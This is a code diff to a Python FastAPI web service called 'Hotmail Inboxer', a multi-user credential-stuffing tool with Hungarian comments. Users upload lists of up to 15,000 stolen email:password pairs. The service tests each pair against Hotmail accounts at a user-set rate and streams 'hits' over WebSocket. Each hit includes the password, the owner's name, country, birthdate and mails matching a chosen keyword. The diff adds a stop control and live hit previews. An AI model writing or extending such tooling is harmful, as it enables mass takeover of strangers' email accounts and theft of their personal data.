@@ -19,7 +19,6 @@ from checker import checker_worker_single
 # ============================================================
 app = FastAPI(title="Hotmail Inboxer Multi-User")
 
-# CORS Middleware
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -28,19 +27,21 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Templates & Static
 templates = Jinja2Templates(directory="templates")
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
-# WebSocket connections per user: {user_id: [ws_info1, ws_info2, ...]}
+# WebSocket connections per user
 user_connections = {}
 ws_lock = threading.Lock()
+
+# STOP FLAGS (user_id: asyncio.Event)
+stop_flags = {}
+stop_lock = threading.Lock()
 
 # ============================================================
 # WEBSOCKET BROADCAST
 # ============================================================
 def broadcast_to_user(user_id: str, message: str):
-    """Üzenet küldése egy adott user összes WebSocket kapcsolatának"""
     with ws_lock:
         if user_id not in user_connections:
             return
@@ -81,17 +82,11 @@ async def dashboard_page(request: Request):
 @app.post("/api/register")
 async def register(email: str = Form(...), password: str = Form(...)):
     if len(password) < 6:
-        raise HTTPException(
-            status_code=400,
-            detail="A jelszónak legalább 6 karakter hosszúnak kell lennie"
-        )
+        raise HTTPException(status_code=400, detail="A jelszónak legalább 6 karakter hosszúnak kell lennie")
     
     existing = await get_user_by_email(email)
     if existing:
-        raise HTTPException(
-            status_code=400,
-            detail="Ez az email már regisztrálva van"
-        )
+        raise HTTPException(status_code=400, detail="Ez az email már regisztrálva van")
     
     hashed_pw = hash_password(password)
     user_id = await create_user(email, hashed_pw)
@@ -104,10 +99,7 @@ async def login(email: str = Form(...), password: str = Form(...)):
     user = await get_user_by_email(email)
     
     if not user or not verify_password(password, user["password"]):
-        raise HTTPException(
-            status_code=401,
-            detail="Hibás email vagy jelszó"
-        )
+        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó")
     
     token = create_access_token({"sub": email})
     return {"token": token, "email": email}
@@ -120,35 +112,28 @@ async def get_current_user_info(current_user = Depends(get_current_user)):
     }
 
 # ============================================================
-# CHECKER ROUTES (ÚJ: SEBESSÉG PARAMÉTERREL)
+# CHECKER ROUTES
 # ============================================================
 @app.post("/api/start")
 async def start_checker(
     file: UploadFile,
     keyword: str = Form(...),
-    speed: float = Form(0.3),  # ← ÚJ PARAMÉTER!
+    speed: float = Form(0.3),
     current_user = Depends(get_current_user)
 ):
-    """Checker indítása (SEBESSÉG BEÁLLÍTÁSSAL)"""
-    # Aktív checker ellenőrzés
+    """Checker indítása"""
     active = await get_active_run(str(current_user["_id"]))
     if active:
-        raise HTTPException(
-            status_code=400,
-            detail="Már fut egy checker! Várd meg, amíg befejeződik."
-        )
+        raise HTTPException(status_code=400, detail="Már fut egy checker! Várd meg, amíg befejeződik.")
     
-    # Sebesség validálás
     if speed < 0.05:
         speed = 0.05
     elif speed > 5.0:
         speed = 5.0
     
-    # Combo fájl beolvasása
     content = await file.read()
     combo_text = content.decode("utf-8", errors="ignore")
     
-    # Validálás
     lines = []
     for line in combo_text.splitlines():
         line = line.strip()
@@ -160,42 +145,54 @@ async def start_checker(
     total = len(lines)
     
     if total == 0:
-        raise HTTPException(
-            status_code=400,
-            detail="Nincs érvényes email:jelszó sor a fájlban"
-        )
+        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor a fájlban")
     
     if total > 15000:
-        raise HTTPException(
-            status_code=400,
-            detail="Maximum 15000 account engedélyezett egyszerre"
-        )
+        raise HTTPException(status_code=400, detail="Maximum 15000 account engedélyezett egyszerre")
     
-    # MongoDB-ben létrehozzuk a run-t
     run_id = await create_run(str(current_user["_id"]), keyword, total)
     
-    # Háttérben indítjuk (SEBESSÉG PARAMÉTERREL)
+    # Stop flag létrehozása
+    user_id = str(current_user["_id"])
+    with stop_lock:
+        stop_flags[user_id] = asyncio.Event()
+    
     threading.Thread(
         target=run_checker_background,
-        args=(run_id, str(current_user["_id"]), lines, keyword, speed),  # ← speed
+        args=(run_id, user_id, lines, keyword, speed),
         daemon=True
     ).start()
     
     return {"run_id": run_id, "total": total, "speed": speed}
 
+@app.post("/api/stop")
+async def stop_checker(current_user = Depends(get_current_user)):
+    """Checker leállítása (ÚJ!)"""
+    user_id = str(current_user["_id"])
+    
+    with stop_lock:
+        if user_id in stop_flags:
+            stop_flags[user_id].set()  # Jelzés a szálnak
+            return {"status": "stopping"}
+    
+    raise HTTPException(status_code=404, detail="Nincs futó checker")
+
 def run_checker_background(run_id: str, user_id: str, lines: list, keyword: str, speed: float):
-    """Háttérszál - új event loop"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(execute_checker(run_id, user_id, lines, keyword, speed))
     loop.close()
+    
+    # Stop flag törlése
+    with stop_lock:
+        if user_id in stop_flags:
+            del stop_flags[user_id]
 
 async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
-    """Checker futtatás (DINAMIKUS SEBESSÉGGEL)"""
+    """Checker futtatás (STOP SUPPORT + LIVE HITS KÜLDÉS)"""
     checked = hits = custom = bad = retries = 0
     total = len(lines)
     
-    # Kezdő log (sebesség kiírással)
     broadcast_to_user(user_id, json.dumps({
         "type": "log",
         "level": "info",
@@ -203,6 +200,18 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     }))
     
     for line in lines:
+        # STOP ellenőrzés
+        with stop_lock:
+            if user_id in stop_flags and stop_flags[user_id].is_set():
+                broadcast_to_user(user_id, json.dumps({
+                    "type": "log",
+                    "level": "info",
+                    "text": f"[LEÁLLÍTVA] User által megállítva ({checked}/{total})"
+                }))
+                await finish_run(run_id)
+                broadcast_to_user(user_id, json.dumps({"type": "stopped"}))
+                return
+        
         if ':' not in line or '@' not in line:
             continue
         
@@ -211,12 +220,10 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         except:
             continue
         
-        # Checker hívás
         result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
         
         checked += 1
         
-        # Eredmény feldolgozása
         if result["status"] == "hit":
             hits += 1
             data = result["data"]
@@ -227,10 +234,24 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
                 f"Mails={data['mails']}"
             )
             await add_result_to_run(run_id, "hit", line_text)
+            
+            # LOG + LIVE HIT KÜLDÉS (külön üzenet típus!)
             broadcast_to_user(user_id, json.dumps({
                 "type": "log",
                 "level": "hit",
                 "text": f"[HIT] {line_text}"
+            }))
+            broadcast_to_user(user_id, json.dumps({
+                "type": "live_hit",  # ← ÚJ TÍPUS!
+                "data": {
+                    "email": data['email'],
+                    "password": data['password'],
+                    "country": data['country'],
+                    "name": data['name'],
+                    "birthdate": data['birthdate'],
+                    "date": data['date'],
+                    "mails": data['mails']
+                }
             }))
             
         elif result["status"] == "custom":
@@ -242,10 +263,21 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
                 f"Birthdate={data['birthdate']}"
             )
             await add_result_to_run(run_id, "custom", line_text)
+            
             broadcast_to_user(user_id, json.dumps({
                 "type": "log",
                 "level": "custom",
                 "text": f"[CUSTOM] {line_text}"
+            }))
+            broadcast_to_user(user_id, json.dumps({
+                "type": "live_custom",  # ← ÚJ TÍPUS!
+                "data": {
+                    "email": data['email'],
+                    "password": data['password'],
+                    "country": data['country'],
+                    "name": data['name'],
+                    "birthdate": data['birthdate']
+                }
             }))
             
         elif result["status"] == "bad":
@@ -259,7 +291,6 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         else:
             retries += 1
         
-        # Stats frissítése
         await update_run_stats(run_id, {
             "checked": checked,
             "hits": hits,
@@ -268,7 +299,6 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
             "retries": retries
         })
         
-        # Stats küldése WebSocket-en
         broadcast_to_user(user_id, json.dumps({
             "type": "stats",
             "run_id": run_id,
@@ -280,10 +310,8 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
             "total": total
         }))
         
-        # DINAMIKUS SEBESSÉG (user által beállított)
-        await asyncio.sleep(speed)  # ← EZ A KULCS!
+        await asyncio.sleep(speed)
     
-    # Futtatás lezárása
     await finish_run(run_id)
     
     broadcast_to_user(user_id, json.dumps({
@@ -298,7 +326,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     }))
 
 # ============================================================
-# OTHER API ENDPOINTS
+# OTHER API
 # ============================================================
 @app.get("/api/runs")
 async def get_user_runs_list(current_user = Depends(get_current_user)):
@@ -327,11 +355,7 @@ async def get_run_details(run_id: str, current_user = Depends(get_current_user))
     return run
 
 @app.get("/api/download/{run_id}/{type}")
-async def download_results(
-    run_id: str,
-    type: str,
-    current_user = Depends(get_current_user)
-):
+async def download_results(run_id: str, type: str, current_user = Depends(get_current_user)):
     run = await get_run(run_id)
     
     if not run or run["user_id"] != str(current_user["_id"]):
@@ -350,9 +374,7 @@ async def download_results(
     
     return PlainTextResponse(
         content=content,
-        headers={
-            "Content-Disposition": f'attachment; filename="{filename}"'
-        }
+        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
     )
 
 # ============================================================
@@ -412,10 +434,10 @@ if __name__ == "__main__":
     port = int(os.getenv("PORT", 8000))
     
     print("\n" + "="*60)
-    print("  🚀 Hotmail Inboxer - Multi-User Edition v2")
+    print("  🚀 Hotmail Inboxer - Multi-User Edition v3")
     print(f"  📡 http://0.0.0.0:{port}")
     print(f"  🔐 MongoDB: Configured")
-    print(f"  ⚡ Speed Control: ENABLED")
+    print(f"  ⚡ Features: Speed Control + STOP + Live Preview")
     print("="*60 + "\n")
     
     uvicorn.run(
